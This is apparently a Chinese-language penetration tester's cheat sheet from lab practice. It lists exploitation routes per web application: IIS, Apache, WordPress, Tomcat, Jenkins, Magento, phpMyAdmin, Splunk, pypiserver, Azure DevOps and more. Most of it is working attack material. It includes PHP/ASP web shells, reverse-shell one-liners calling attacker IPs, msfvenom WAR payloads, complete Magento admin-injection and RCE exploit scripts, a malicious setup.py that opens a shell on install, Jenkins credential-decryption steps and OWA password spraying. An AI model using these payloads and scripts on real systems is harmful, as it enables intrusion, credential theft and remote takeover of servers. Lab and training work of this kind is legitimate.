可以尝试上传 web.config
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

shell.aspx

shell.asp
```asp
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

cmd.php
```php
<?php system($_GET['cmd']); ?>
```

**web.config 默认位置，其中可能包含密码或用户名等敏感信息**
`C:\inetpub\wwwroot\web.config`

### SharePoint
最好添加一下主机名到 hosts 文件中
**常见目录**
```
_layouts/viewlsts.aspx

```


### Apache
**配置文件目录**
```
/etc/apache2/sites-enabled/000-default.conf
```

**Apache Commons Text 1.8**
https://github.com/kljunowsky/CVE-2022-42889-text4shell
PAYLOAD: (无回显，直接弹反弹 shell 就好)
```
?query=%24%7bscript%3ajavascript%3ajava.lang.Runtime.getRuntime().exec('%2fbin%2fbash%20-c%20bash%24IFS%249-i%3e%26%2fdev%2ftcp%2f192.168.45.199%2f2233%3c%261')%7d
```


**Apache 2.4.49 EXP**
```bash
curl -X POST -d 'echo;id' http://192.168.152.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh   (RCE)
curl http://192.168.152.245/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
curl http://192.168.152.245/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
```


### nginx
**配置文件目录**
```bash
/etc/nginx/sites-enabled
/etc/nginx/sites-available/
```


### Cuppa CMS

- Cuppa CMS - '/alertConfigField. php' Local/Remote File Inclusion 
	inclusion **Local** shell. php  >  [Metasploit Framework](Metasploit%20Framework.md)


### WordPress

##### Reverse_tcp Shell
![](photos/Pasted%20image%2020231205101952.png)
`404.php`    **PATH** ->          /wp-content/themes/twentysixteen/404.php

**枚举用户名** Lost your password?  中可以暴力枚举
**枚举目录 ：** /plugins 目录查看，可能有高价值信息

##### 访问受限制的文章 (CVE-2019-17671)
利用易受攻击的 WordPress 版本来查看草稿、受密码保护和私人帖子 ;
如果返回的第一个帖子是公开的，则所有帖子都将转储到该页面  
```
?static=1
例： http://office.paper/?static=1
```




### Fobidden ( SeedDMS CMS? ) : /conf File

![](photos/Pasted%20image%2020231210104459.png)
![](photos/Pasted%20image%2020231210104524.png)
Limit of `.htaccess`

![](photos/Pasted%20image%2020231210105643.png)

或许对  `settings.xml.template` 是允许访问的


### Joomla

![](photos/Pasted%20image%2020231228195347.png)

Modify index.php and add Reverse Shell : 

![](photos/Pasted%20image%2020231228200147.png)

###### CVE-2023-23752  (4.0.0 through 4.2.7)

```bash
curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq .
```

Login in to Admin dashboard , and click the **System** Left 
![](photos/Pasted%20image%2020240206150945.png)

Edit index.php  , Pentestmonkey's reverse shell



### TOMCAT 

Password Crack (burpsuite)
```
Directory: Seclists\Passwords\Default-Credentials\tomcat-betterdefaultpasslist_base64encoded.txt
```

- **Apache Struts 2.3.x （2.3.15） Showcase RCE**
https://medium.com/@lucideus/exploiting-apache-struts2-cve-2017-5638-lucideus-research-83adb9490ede

```bash
python2 exp1.py http://192.168.0.100:8080/struts2_2.3.15.1-showcase/ "bash -i >& /dev/tcp/192.168.0.104/1337 0>&1"
```

- **tomcat 的用户信息配置文件路径 (配合已找到的 LFI)**
```
/usr/share/tomcat9/etc/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
```

- **Password:**
```
tomcat:s3cret
admin:admin
```

- **War 包反弹 shell，如果返回 OK , 就可能可以继续利用**
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.212.97:8080/manager/text/list   
```
生成有效负载
```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.11 lport=2233 -f war -o rev.10.10.14.11-2233.war
```
建立监听后执行上传文件命令，访问上传的路径后，得到反弹 shell 
```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.212.97:8080/manager/text/deploy?path=/xek --upload-file rev.10.10.14.11-2233.war
```
`--upload-file` ： 使用 HTTP PUT 上传
`?path=/xek` : 上传的路径 , ( `http://10.129.212.97:8080/xek`)


### Drupal
version : /CHANGELOG.txt

- Exploit Version **Drupal 7.x**
	Drupal 7.x Module Services - Remote Code Execution
	Drupal endpoint_path 路径 : **/usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt**
	
- Drupal 默认凭据 : **admin/admin**

 **Reverse Shell：**
查看 Modules 下有没有可利用的模块
![](photos/Pasted%20image%2020240115214504.png)

点击 Add content ，添加 page，写入一个反弹 shell 的 php，简单修改一下，下面**文本类型选择 php code**

![](photos/Pasted%20image%2020240115220742.png)

在 kali 建立2233和443**两个**端口，建立本地 samba 服务，然后在 Find content 点击刚刚创建的 page ，拿到系统 shell


### Jetty (Jenkins)
- **敏感文件**
```
/var/jenkins_home/secrets/initialAdminPassword   (管理员默认密码存储文件)
```

- **执行系统命令**
New Item > Freestyle Project
创建后点击进入 Conigure , 在 Build Triggers 中选择 Build periodically
输入 `* * * * *` , 代表每分钟执行一次
在 Build 中选择 Execute Windows batch command 
例: `cmd.exe /c whoami`

- **Jenkins 2.317 破解凭据** **\> [0x19 object (Jenkins 解密访问凭据,Bloodhound)](../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x19%20object%20(Jenkins 解密访问凭据,Bloodhound).md) <**
Jenkins 的凭据文件一般保存在 
```
C:\Users\<User>\AppData\Local\Jenkins\.jenkins\secrets
```
转储凭据需要用到
- credentials.xml （名字不一定相同，保存加密的凭据）
- hudson.util.Secret (用来解密 credentials.xml)
- master.key (解密 hudson.util.Secret)

修改命令为 `cmd.exe /c dir C:\Users\<User>\AppData\Local\Jenkins\.jenkins\secrets` 耐心枚举
如果 type 输入乱码可以尝试
```powershell
cmd.exe /c certutil -encode C:\Users\<User>\AppData\Local\Jenkins\.jenkins\secrets\master.key master_b64 & more .\master_b64
```
输出就是原文，不需要 base64 -d

xml 文件可能在别处，例 `C:\Users\<Users>\AppData\Local\Jenkins\.jenkins\users\admin_xxxxxxxxxxx\config.xml`

搜集到三个文件后使用 github 的 python 脚本解密即可
https://github.com/hoto/jenkins-credentials-decryptor
```
~/tool/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml 
```

- **CVE-2024-23897 , Jenkins 2.441  任意文件读取** 
```bash
└─$ wget http://10.129.247.148:8080/jnlpJars/jenkins-cli.jar
java -jar jenkins-cli.jar -s 'http://10.129.247.148:8080' help '@/etc/passwd'

java -jar jenkins-cli.jar -s 'http://10.129.247.148:8080' reload-job '@/var/jenkins_home/users/users.xml'  
<string>jennifer_xxxxxx</string>: No such item ‘      <string>jennifer_xxxxxxx</string>’ exists.

java -jar jenkins-cli.jar -s 'http://10.129.247.148:8080' reload-job '@/var/jenkins_home/users/jennifer_xxxx/config.xml'
(最后一行可能会有password hash)
hashcat -m 3200 ./hash_raw /usr/share/wordlists/rockyou.txt

jennifer:password 登录jenkins
```

- **登录 jenkins ，如果在凭据> 高权限用户> Update (credentials)** 
如果存在 Private Key , 可以尝试 Shift + Ctrl + C 查看是否可以查看加密内容
```bash
<input name="_.privateKey" type="hidden" value="xxxxxx">
```

Dashboard > Manage Jenkins > Script Console
```bash
println(hudson.util.Secret.decrypt("xxxxx"))
```
直接 run 就可以看到解密后的数据


### Magento 
2014-2015 , Version 号为1.9.x

**远程添加管理员漏洞 （Magento eCommerce - Remote Code Execution）：**
(修改 target 带 index.php , 也可以修改密码)
```python
import requests
import base64
import sys

target = "http://swagshop.htb/index.php"

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

q="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""


query = q.replace("\n", "").format(username="xekoner", password="xekoner")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
r = requests.post(target_url,
                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                        "filter": base64.b64encode(pfilter),
                        "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin".format(target)
else:
    print "DID NOT WORK"
```


**远程命令执行   (Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution) :**
需要修改 username，password （可以配合远程添加 admin 漏洞）和 install_date（/app/etc/local.xml 中查找）
例: `python2.7 rce.py http://swagshop.htb/index.php/admin/ "id"`
```python
#!/usr/bin/python
# Exploit Title: Magento CE < 1.9.0.1 Post Auth RCE
# Google Dork: "Powered by Magento"
# Date: 08/18/2015
# Exploit Author: @Ebrietas0 || http://ebrietas0.blogspot.com
# Vendor Homepage: http://magento.com/
# Software Link: https://www.magentocommerce.com/download
# Version: 1.9.0.1 and below
# Tested on: Ubuntu 15
# CVE : none

from hashlib import md5
import sys
import re
import base64
import mechanize


def usage():
    print "Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\""
    sys.exit()


if len(sys.argv) != 3:
    usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

# Config.
username = 'xekoner'
password = 'xekoner'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)
# Setup the mechanize browser and options
br = mechanize.Browser()
#br.set_proxies({"http": "localhost:8080"})
br.set_handle_robots(False)

request = br.open(target)

br.select_form(nr=0)
#br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
#br.form.fixup()
#br['login[username]'] = username
#br['login[password]'] = password

userone = br.find_control(name="login[username]", nr=0)
userone.value = username
pwone = br.find_control(name="login[password]", nr=0)
pwone.value = password

br.method = "POST"
request = br.submit()
content = request.read()

url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

try:
    request = br.open(exploit)
except (mechanize.HTTPError, mechanize.URLError) as e:
    print e.read()
```


### PhpMyAdmin
**Version 4.8.0 ~ 4.8.1  - 远程命令执行漏洞 (CVE-2018-12613)**

存在 LFI  ：`http://10.129.214.206/phpmyadmin/index.php?target=sql.php%3f/../../../../../etc/passwd`

打开 burpsuite，提交 sql 查询抓 cookie 数值
```sql
SELECT '<?php system($_GET["cmd"]);?>'

Cookie: phpMyAdmin=c7b5dm84puvbpfr8bvcv0sbhbn8ncie2; pma_lang=en; pmaUser-1=
```
访问 :
```http
http://10.129.214.206/phpmyadmin/?cmd=id&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_<Cookie>

http://10.129.214.206/phpmyadmin/?cmd=id&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_c7b5dm84puvbpfr8bvcv0sbhbn8ncie2
```
![](photos/Pasted%20image%2020240402191749.png)

Reverse Shell:
```http
http://10.129.214.206/phpmyadmin/?cmd=nc -e /bin/sh 10.10.14.25 2233&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_c7b5dm84puvbpfr8bvcv0sbhbn8ncie2
```


### Pi-Hope 
**SSH Default Credentials :**    pi  /  raspberry


### Torrent Hoster
**Reverse Shell**
注册/登录后上传一个 torrent 文件，等待重定向界面，点击  `Edit this torrent`
上传 Screenshot , 一句话木马用 backdoor.php.gif , 抓包改包即可
上传文件目录为： `/torrent/upload/` 


### webmin
**Version < 1.910 , 任意命令执行漏洞**  （需要经过身份验证，CVE-2019-12840）
MSF ： exploit/linux/http/webmin_packageup_rce
Python :  https://0xdf.gitlab.io/2020/03/14/htb-postman.html#priv-matt--root


### Splunk
https://github.com/cnotin/SplunkWhisperer2/tree/master
需要经过凭据验证，远程命令执行，使用 PySplunkWhisperer2下的 PySplunkWhisperer2_remote.py
```bash
python PySplunkWhisperer2_remote.py --host 10.129.2.21 --lhost 10.10.14.11 --username shaun --password Guitar123 --payload 'ping -c 1 10.10.14.11'
```
` sudo tcpdump -ei tun0 icmp` 在 kali 建立流量监听，检查是否执行成功

Rev Shell Payload:
```bash
python PySplunkWhisperer2_remote.py --host 10.129.2.21 --lhost 10.10.14.11 --username shaun --password Guitar123 --payload 'bash -c "bash -i >& /dev/tcp/10.10.14.11/1337 0>&1"'
```


### pypiserver
**身份验证 hash 位置为主目录下的 `.htpasswd` 文件**

**创建恶意 Python 包  (需要 pypi 的凭据信息)**
https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/
- setup.py  
```python
import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

class Exploit(install):
    def run(self):
        RHOST = '10.10.14.11'
        RPORT = 7788
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        for i in range(3):
            os.dup2(s.fileno(), i)
        p = subprocess.call(["/bin/sh","-i"])

setup(name='revshell',
      version='0.0.1',
      description='Reverse Shell',
      author='xekOnerR',
      author_email='xekOnerR',
      url='http://sneakycopy.htb',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': Exploit})
```
(`__init__.py` 为空文件，其余和 URL 一样)
```bash
└─$ tree revshell

revshell
├── README.md
├── revshell
│   └── __init__.py
├── setup.cfg
└── setup.py
```

远程打包库操作：新增凭据文件：
位置 ： **~/.pypirc**
```bash
└─$ cat ~/.pypirc

[distutils]
index-servers =
  sneaky
[sneaky]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

建立监听后执行：
```bash
python setup.py sdist upload -r sneaky
```


### CuteNews 
**用户凭据信息：**
(使用 SHA2-256破解，  hashcat -m 1400)
获得 shell 可以访问：
```bash
cd /var/www/html/CuteNews/cdata/users/[first two characters of the md5 of the username].php

for f in *; do cat $f | grep -v 'php die'; echo; done | grep . | while read line; do echo $line | base64 -d; echo; done | grep '"pass"'
```

直接 curl 也可以：
```bash
curl -s http://10.129.212.55/CuteNews/cdata/users/lines | grep -v "php die" | while read line; do decode=$(echo $line | base64 -d); email=$(echo $decode | grep -Po '\w+@\w+\.\w+'); hash=$(echo $decode | grep -Po '\w{64}'); if [ -n "$hash" ]; then echo "$email:$hash"; fi; done
```


### Zabbix 
查看是否开放623 UDP 端口，如果开放了就可以尝试获取管理员密码
[623 - IPMI (UDP)](0x01%20PORTS%20-%20Checklist/623%20-%20IPMI%20(UDP).md)


### Rj Editor 
系统命令执行:
```bash
system("id", intern=TRUE)
system("bash -c 'bash -i >& /dev/tcp/10.10.14.23/443 0>&1'", intern=TRUE)
```


### Bolt
**bolt CMS 的登录界面位于** `/bolt/bolt`

**Blot 登录后的 SSTI 漏洞拿 Rev Shell**
在 Configuration > Main Configuration 中可以找到 theme 关键词，判断出当前使用的模板
SETTINGS > File management > View File management  , 选择 View & edit templates
选中当前使用的模板后，进入 index.twig , 插入 SSTI Payload    
|> [SSTI Injection](SSTI%20Injection.md)
插入后 Save changes 保存 , 进入 Maintenance > Clear the cache , 点击 Clear the cache
刷新 index 站点，回显位于坐上角


### NSClient ++
**配置文件位置:**
```
C:\Program Files\NSClient++\nsclient.ini
```

**如果有了低权限的 PS Session，可以直接查询密码**
```cmd
nadine@SERVMON C:\Program Files\NSClient++> nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
或者
c:\program files\nsclient++\nsclient.ini
```


### Azure DevOps
**上传 WebShell**
Repos > Files > New branch
![](photos/Pasted%20image%2020240505200451.png)
创建一个分支后，Upload File(s) , 上传 cmd.aspx 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
新建一个推拉请求 （New Pull Request）> Create
![](photos/Pasted%20image%2020240505205458.png)
进入 Pipelines > Builds ，构建刚刚我们自己创建的分支
![](photos/Pasted%20image%2020240505210152.png)
等待构建完毕，添加 hosts
使用的 spectral-CI 就添加 `spectral.worker.htb`
访问 `http://spectral.worker.htb/cmd.aspx` 得到我们上传的 webshell
![](photos/Pasted%20image%2020240505210628.png)
```powershell
/c powershell iwr -Uri 10.10.14.50/nc64.exe -OutFile C:\programdata\n.exe
/c C:\programdata\n.exe -e cmd 10.10.14.50 2233
```


**利用 Azure DevOps 的其他管道相关任务获得 shell [适用于已经获得 shell 后的权限提升]**
Pipelines > Builds  > New pipeline
选择 `Use the classic editor` 
选择自己创建的分支，然后点击继续
选择 Empty pipeline > Apply
Agent pool 填写 Manage 中的 Pool , 一般是 Setup
![](photos/Pasted%20image%2020240505235854.png)
填写后点击 `+` , 搜索 powershell > Add
Script Path 填写 nishang 的 Invoke-PowerShellTcpOneLine.ps1
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.50',2233);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
先上传文件，建立监听，然后点击 `Save & queue` , 获得 rev shell


### FreeSwitch
凭据配置文件位置：
```
/etc/freeswitch/autoload_configs/event_socket.conf.xml
```

**FreeSWITCH 1.10.1 - Command Execution**
https://www.exploit-db.com/exploits/47799
可能需要修改密码来利用漏洞
```bash
└─$ python exp.py 192.168.218.240 'id&&which nc'
Authenticated
Content-Type: api/response
Content-Length: 75

uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
/usr/bin/nc
```


### outlook Web (Office 365, Exchange)
https://github.com/dafthack/MailSniper
```powershell
ipmo C:\Tools\MailSniper\MailSniper.ps1
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io  (枚举目标域的 NetBIOS 名称)
访问域搜寻信息
```

验证用户名有效性，配合 namemash.py (不知道邮箱格式的情况下)
https://gist.github.com/superkojiman/11076951
```bash
~/namemash.py names.txt > possible.txt
```

```powershell
Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```

密码喷射
```powershell
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

获得有效凭据后可以继续 dump 数据：
```powershell
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt   (dump mail address)
```


### MojoPortal v2.7 登录到后台无限制上传文件
https://weed-1.gitbook.io/cve/mojoportal/upload-malicious-file-in-mojoportal-v2.7-cve-2022-40341
访问 `http://IP/Admin/FileManagerAlt.aspx`
https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
上传 `shell.aspx.png` ，改名为 `cmd.aspx`
访问 : `http://IP123`


### pwm 实例
登录后进入 `Configuration Editor`
可以编辑 LDAP > default > Connection 中的 URLs 
删除内容后填写 `ldap://IP:389` , 本地建立监听后点击 `Test LDAP Profile`
可以获得明文的 ldap 凭据 （也可以使用 wireshark 抓包获得 password）（也可以使用 responder）
![](photos/Pasted%20image%2020241118101735.png)


### Ghost CMS
拿到用户名，密码后可以尝试
https://github.com/0xyassine/CVE-2023-40028/blob/master/README.md
任意文件读取漏洞，读取文件
```
file> /var/lib/ghost/config.production.json
```
 
可能会存在文件名，密码


### GraphQL
https://www.yeswehack.com/learn-bug-bounty/how-exploit-graphql-endpoint-bug-bounty
GraphQL 终端节点可能路径
```js
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

```bash
curl -s http://10.129.230.159:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq  -c .

{"data":{"__schema":{"queryType":{"name":"Query","fields":[{"name":"user","description":""}]}}}}
```

```bash
└─$ curl -s http://10.129.230.159:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types { name } } }" }' | jq -c .

{"data":{"__schema":{"types":[{"name":"Query"},{"name":"User"},{"name":"String"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"Boolean"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

```bash
└─$ curl -s http://10.129.230.159:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") { name fields { name } } }" }' | jq .
{
  "data": {
    "__type": {
      "name": "User",
      "fields": [
        {
          "name": "username"
        },
        {
          "name": "password"
        }
      ]
    }
  }
}

```

```bash
└─$ curl -s http://10.129.230.159:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```


### Pluck CMS v.4.7.18 - 本地文件包含未经身份验证 （CVE-2024-9405)
https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405
```
└─$ curl 'http://10.129.231.20/data/modules/albums/albums_getimage.php?image=admin_backup.php'
<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
?>146
```

### Pluck CMS v.4.7.18 - `经过验证的` 任意文件上传
- cmd.php
```php
<?php system($_REQUEST('cmd')); ?>
```

```bash
mkdir shell
mv cmd.php shell
zip -r shell.zip shell/
```

options > manage modules > Install a module...
上传刚刚压缩的 shell.zip 后
在 `http://IP/data/modules/` 中应该可以找到 shell 文件夹，里面就是我们之前创建的文件


### October CMS
**默认登录 URL**
```
http://IP/backend/backend/auth/signin
```

**默认登录密码**
```
admin:admin
```


**任意文件上传 EXP**
https://0xdf.gitlab.io/2019/03/26/htb-october.html
- cmd.php5
```php
<?php system($_REQUEST["cmd"]); ?>
```

```
http://IP/storage/app/media/cmd.php5?cmd=id
```



### PhpLiteAdmin <= `1.9.3` LFI Command Execute
必须要经过身份验证 + 存在本地文件包含：
- 创建一个 qwe.php
- 创建一个 shell 表，字段为1, 内容为 TEXT, `<?php system($_REQUEST["cmd"]); ?>` ; 

- 替代方法为创建一个 qwe.php 
- 创建一个 qwe ，字段为1，Field 段填写 `<?php system($_REQUEST["cmd"]); ?>` ; 类型为 TEXT, 也可以达到命令执行的效果


### phpinfo : `file_uploads = on` + LFI = RCE
https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp